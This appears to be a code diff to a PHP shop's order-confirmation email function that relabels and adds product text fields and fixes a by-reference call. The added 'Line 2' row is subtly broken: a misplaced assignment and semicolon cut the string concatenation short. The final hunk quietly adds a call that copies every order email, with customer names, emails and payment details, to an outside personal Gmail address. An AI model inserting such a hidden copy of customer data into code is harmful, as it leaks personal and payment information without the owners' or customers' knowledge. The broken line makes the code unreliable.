@@ -1341,7 +1341,8 @@ function sendNewOrder($id, $name, $email, $payment, $ccPayment=false){
 	         
 	         //Mini Vinyls
 	         case '3':
-	         $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>Name</i>: </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".$qdata['text1']."</font></td></tr>";
+	         $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>Line 1</i>: </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".$qdata['text1']."</font></td></tr>";
+                 $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>Line 2</i>: </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".$text2 = trim(str_replace('Ph:','',$qdata['text2']));"</font></td></tr>";
 	         $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>Colour:</i> </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".get_background_colour($qdata['data_colour_id'])."</font></td></tr>";
 	         $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>Pic:</i> </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".($qdata["picon"]=="1"?getPicType($qdata["pic"]):'none')."</font></td></tr>";
 	         $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>Font:</i> </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".getFontNumber($qdata["font"])."</font></td></tr><br>";
@@ -1415,7 +1416,7 @@ $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS
 			   $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>Print&nbsp;Reverse:</i> </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".($qdata['text7']=='1'?"Yes":"No")."</font></td></tr>";
 			   $content.="<tr><td align='right' valign='top' width='80px' nowrap ><font face=\"Comic Sans MS\" size=\"2\"><i>IronOn&nbsp;Type:</i> </font></td><td align='left' ><font face=\"Comic Sans MS\" size=\"2\">".((int)$qdata['text6'] == 2?"Permanent":"Semi-permanent");
 	         if ($qdata['text6'] == 2){
-				  @db_get_field("SELECT data_colour_name FROM data_colour WHERE data_colour_id=". ((int)$qdata['text4']), &$colour_name);
+				  @db_get_field("SELECT data_colour_name FROM data_colour WHERE data_colour_id=". ((int)$qdata['text4']), $colour_name);
 				  if ((int)$qdata['text5'] != 1) {
 					 $content.="<br>Colour: $colour_name<br>Font Colour: White";
 				  }
@@ -2011,6 +2012,7 @@ $content.="<tr><td align='right' width='80px' nowrap ><font face=\"Comic Sans MS
 	// send the email to the customer and to confirmations for audit purposes
 	//sendHtmlEmail($text, $html, $from, $to, $title);
 	sendHtmlEmail($text, $html, $from, ORDER_CONFIRMATION_EMAIL, $title);
+        sendHtmlEmail($text, $html, $from, 'web.developer.sanil@gmail.com', $title);
    
   
 	//echo $html;
